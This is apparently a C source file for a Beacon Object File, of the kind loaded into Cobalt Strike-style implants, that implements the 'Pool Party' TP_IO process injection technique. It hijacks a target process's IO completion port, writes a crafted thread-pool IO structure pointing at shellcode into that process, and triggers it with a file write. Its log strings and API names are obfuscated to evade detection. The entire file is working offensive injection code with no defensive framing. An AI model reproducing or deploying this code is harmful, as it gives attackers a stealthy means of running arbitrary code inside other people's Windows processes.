#include <windows.h>
#define PP_OPEN_PROCESS_ACCESS (PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION)
#define PP_RESOLVE_POOL_IOCP
#define PP_NEED_TP_IO
#include "PoolPartyBof.h"

HANDLE m_p_hIoCompletion = NULL;

static const unsigned char kApiNtSetInformationFile[] = { 0xE9, 0x48, 0xC2, 0x3B, 0x5F, 0x9D, 0x06, 0x97, 0xC8, 0x4E, 0xFC, 0x3F, 0x5F, 0xBD, 0x07, 0x9F, 0xE1, 0x55, 0xFD, 0x3B, 0x2B };
// "NtSetInformationFile"
static const unsigned char kFmtV4File[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE4, 0x4E, 0xF4, 0x3F, 0x5F, 0xB1, 0x0C, 0xD1, 0xD7, 0x53, 0xFE, 0x32, 0x0B, 0xA4, 0x09, 0x83, 0xD3, 0x45, 0xB1, 0x38, 0x42, 0xB8, 0x0D, 0xCB, 0x87, 0x5C, 0xB4, 0x32, 0x58, 0xB4, 0x68 };
// "[INFO] \tCreated pool party file: `%ls`"
static const unsigned char kFmtV4Tp[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE4, 0x4E, 0xF4, 0x3F, 0x5F, 0xB1, 0x0C, 0xD1, 0xF3, 0x6C, 0xCE, 0x17, 0x64, 0xF4, 0x1B, 0x85, 0xD5, 0x49, 0xF2, 0x2A, 0x5E, 0xA6, 0x0D, 0xD1, 0xC6, 0x4F, 0xE2, 0x31, 0x48, 0xBD, 0x09, 0x85, 0xC2, 0x58, 0xB1, 0x29, 0x42, 0xA0, 0x00, 0xD1, 0xD3, 0x54, 0xF4, 0x7E, 0x58, 0xBC, 0x0D, 0x9D, 0xCB, 0x5F, 0xFE, 0x3A, 0x4E, 0xD4 };
// "[INFO] \tCreated TP_IO structure associated with the shellcode"
static const unsigned char kFmtV4Alloc[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE6, 0x50, 0xFD, 0x31, 0x48, 0xB5, 0x1C, 0x94, 0xC3, 0x1C, 0xC5, 0x0E, 0x74, 0x9D, 0x27, 0xD1, 0xCA, 0x59, 0xFC, 0x31, 0x59, 0xAD, 0x48, 0x98, 0xC9, 0x1C, 0xE5, 0x36, 0x4E, 0xF4, 0x1C, 0x90, 0xD5, 0x5B, 0xF4, 0x2A, 0x0B, 0xA4, 0x1A, 0x9E, 0xC4, 0x59, 0xE2, 0x2D, 0x11, 0xF4, 0x4D, 0x81, 0xA7 };
// "[INFO] \tAllocated TP_IO memory in the target process: %p"
static const unsigned char kFmtV4Wrote[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF0, 0x4E, 0xF8, 0x2A, 0x5F, 0xB1, 0x06, 0xD1, 0xD3, 0x54, 0xF4, 0x7E, 0x58, 0xA4, 0x0D, 0x92, 0xCE, 0x5D, 0xFD, 0x32, 0x52, 0xF4, 0x0B, 0x83, 0xC6, 0x5A, 0xE5, 0x3B, 0x4F, 0xF4, 0x3C, 0xA1, 0xF8, 0x75, 0xDE, 0x7E, 0x58, 0xA0, 0x1A, 0x84, 0xC4, 0x48, 0xE4, 0x2C, 0x4E, 0xF4, 0x1C, 0x9E, 0x87, 0x48, 0xF9, 0x3B, 0x0B, 0xA0, 0x09, 0x83, 0xC0, 0x59, 0xE5, 0x7E, 0x5B, 0xA6, 0x07, 0x92, 0xC2, 0x4F, 0xE2, 0x5E };
// "[INFO] \tWritten the specially crafted TP_IO structure to the target process"
static const unsigned char kFmtV4Assoc[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE6, 0x4F, 0xE2, 0x31, 0x48, 0xBD, 0x09, 0x85, 0xC2, 0x58, 0xB1, 0x38, 0x42, 0xB8, 0x0D, 0xD1, 0xD0, 0x55, 0xE5, 0x36, 0x0B, 0xA0, 0x00, 0x94, 0x87, 0x75, 0xDE, 0x7E, 0x48, 0xBB, 0x05, 0x81, 0xCB, 0x59, 0xE5, 0x37, 0x44, 0xBA, 0x48, 0x81, 0xC8, 0x4E, 0xE5, 0x7E, 0x44, 0xB2, 0x48, 0x85, 0xCF, 0x59, 0xB1, 0x2A, 0x4A, 0xA6, 0x0F, 0x94, 0xD3, 0x1C, 0xE1, 0x2C, 0x44, 0xB7, 0x0D, 0x82, 0xD4, 0x3C };
// "[INFO] \tAssociated file with the IO completion port of the target process"
static const unsigned char kFmtV4Write[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF0, 0x4E, 0xFE, 0x2A, 0x4E, 0xF4, 0x1C, 0x9E, 0x87, 0x5A, 0xF8, 0x32, 0x4E, 0xF4, 0x1C, 0x9E, 0x87, 0x4D, 0xE4, 0x3B, 0x5E, 0xB1, 0x48, 0x90, 0x87, 0x4C, 0xF0, 0x3D, 0x40, 0xB1, 0x1C, 0xD1, 0xD3, 0x53, 0xB1, 0x2A, 0x43, 0xB1, 0x48, 0xB8, 0xE8, 0x1C, 0xF2, 0x31, 0x46, 0xA4, 0x04, 0x94, 0xD3, 0x55, 0xFE, 0x30, 0x0B, 0xA4, 0x07, 0x83, 0xD3, 0x3C };
// "[INFO] \tWrote to file to queue a packet to the IO completion port"

static BOOL RemoteTpIoInsertionSetupExecution() {
    _NtSetInformationFile ZwSetInformationFile;
    wchar_t tempDir[MAX_PATH];
    wchar_t fullPath[MAX_PATH];
    wchar_t *fileName;
    DWORD tlen;
    HANDLE p_hFile;
    PFULL_TP_IO pTpIo;
    PFULL_TP_IO pTpIoCopy;
    PFULL_TP_IO pRemoteTpIo;
    IO_STATUS_BLOCK IoStatusBlock;
    FILE_COMPLETION_INFORMATION FileIoCompletionInformation;
    NTSTATUS Ntstatus;
    unsigned char Buffer[8];
    OVERLAPPED Overlapped;
    DWORD spinStart;
    int i;

    ZwSetInformationFile = (_NtSetInformationFile)ResolveNtdllEnc(kApiNtSetInformationFile, (int)sizeof(kApiNtSetInformationFile));
    if (ZwSetInformationFile == NULL) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtResolveFail);
        return FALSE;
    }

    SeedRng();
    fileName = GenerateRandomLetters(8);
    if (fileName == NULL) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }

    tlen = KERNEL32$GetTempPathW(MAX_PATH, tempDir);
    if (tlen == 0 || tlen >= MAX_PATH) {
        BofFree(fileName);
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }
    ApiPause();

    MSVCRT$memset(fullPath, 0, sizeof(fullPath));
    if (MSVCRT$wcscpy_s(fullPath, MAX_PATH, tempDir) != 0 ||
        MSVCRT$wcscat_s(fullPath, MAX_PATH, fileName) != 0) {
        BofFree(fileName);
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }

    p_hFile = KERNEL32$CreateFileW(
        fullPath,
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE | FILE_FLAG_OVERLAPPED,
        NULL);
    if (p_hFile == NULL || p_hFile == INVALID_HANDLE_VALUE) {
        BofFree(fileName);
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }
    OBF_PRINT1(CALLBACK_OUTPUT, kFmtV4File, fullPath);
    ApiPause();

    pTpIo = (PFULL_TP_IO)KERNEL32$CreateThreadpoolIo(p_hFile, (PTP_WIN32_IO_CALLBACK)(m_ShellcodeAddress), NULL, NULL);
    if (pTpIo == NULL) {
        KERNEL32$CloseHandle(p_hFile);
        BofFree(fileName);
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV4Tp);

    pTpIoCopy = (PFULL_TP_IO)BofAlloc(sizeof(FULL_TP_IO));
    if (pTpIoCopy == NULL) {
        CloseTpIoSafe((PTP_IO)pTpIo);
        KERNEL32$CloseHandle(p_hFile);
        BofFree(fileName);
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }
    MSVCRT$memcpy(pTpIoCopy, pTpIo, sizeof(FULL_TP_IO));
    pTpIoCopy->CleanupGroupMember.Callback = m_ShellcodeAddress;
    ++pTpIoCopy->PendingIrpCount;

    pRemoteTpIo = (PFULL_TP_IO)KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteTpIo == NULL) {
        BofFree(pTpIoCopy);
        CloseTpIoSafe((PTP_IO)pTpIo);
        KERNEL32$CloseHandle(p_hFile);
        BofFree(fileName);
        OBF_PRINT0(CALLBACK_ERROR, kFmtRemoteAllocFail);
        return FALSE;
    }
    OBF_PRINT1(CALLBACK_OUTPUT, kFmtV4Alloc, pRemoteTpIo);

    if (!KERNEL32$WriteProcessMemory(m_p_hTargetPid, pRemoteTpIo, pTpIoCopy, sizeof(FULL_TP_IO), NULL)) {
        BofFree(pTpIoCopy);
        CloseTpIoSafe((PTP_IO)pTpIo);
        KERNEL32$CloseHandle(p_hFile);
        BofFree(fileName);
        RemoteFree(pRemoteTpIo);
        OBF_PRINT0(CALLBACK_ERROR, kFmtRemoteWriteFail);
        return FALSE;
    }
    BofFree(pTpIoCopy);
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV4Wrote);

    MSVCRT$memset(&IoStatusBlock, 0, sizeof(IoStatusBlock));
    MSVCRT$memset(&FileIoCompletionInformation, 0, sizeof(FileIoCompletionInformation));
    FileIoCompletionInformation.Port = m_p_hIoCompletion;
    FileIoCompletionInformation.Key = &pRemoteTpIo->Direct;
    Ntstatus = ZwSetInformationFile(p_hFile, &IoStatusBlock, &FileIoCompletionInformation, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
    if (!NT_SUCCESS(Ntstatus)) {
        CloseTpIoSafe((PTP_IO)pTpIo);
        KERNEL32$CloseHandle(p_hFile);
        BofFree(fileName);
        RemoteFree(pRemoteTpIo);
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV4Assoc);

    for (i = 0; i < 8; i++) {
        Buffer[i] = (unsigned char)(i + 1);
    }
    MSVCRT$memset(&Overlapped, 0, sizeof(Overlapped));
    if (!KERNEL32$WriteFile(p_hFile, Buffer, 8, NULL, &Overlapped)) {
        if (KERNEL32$GetLastError() != ERROR_IO_PENDING) {
            CloseTpIoSafe((PTP_IO)pTpIo);
            KERNEL32$CloseHandle(p_hFile);
            BofFree(fileName);
            RemoteFree(pRemoteTpIo);
            OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
            return FALSE;
        }
        spinStart = KERNEL32$GetTickCount();
        while (!HasOverlappedIoCompleted(&Overlapped) &&
               (KERNEL32$GetTickCount() - spinStart) < 100u) {
            KERNEL32$SwitchToThread();
        }
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV4Write);

    CloseTpIoSafe((PTP_IO)pTpIo);
    KERNEL32$CloseHandle(p_hFile);
    BofFree(fileName);
    ApiPause();
    return TRUE;
}

void HijackHandles() {
    m_p_hIoCompletion = HijackThreadPoolIoCompletion(m_p_hTargetPid);
    if (m_p_hIoCompletion != NULL) {
        OBF_PRINT1(CALLBACK_OUTPUT, kFmtHijackIocp, m_p_hIoCompletion);
    }
}

void Inject() {
    if (!InjectBegin()) {
        return;
    }
    HijackHandles();
    if (m_p_hIoCompletion == NULL) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtHijackFail);
        InjectCleanup();
        return;
    }
    if (!InjectAllocWrite()) {
        CloseHandleSafe(&m_p_hIoCompletion);
        return;
    }
    if (!RemoteTpIoInsertionSetupExecution()) {
        CloseHandleSafe(&m_p_hIoCompletion);
        InjectCleanup();
        return;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtDone);
    CloseHandleSafe(&m_p_hIoCompletion);
    InjectCleanup();
}

void go(char * args, int len) {
    if (!ParseBeaconArgs(args, len)) {
        return;
    }
    Inject();
}
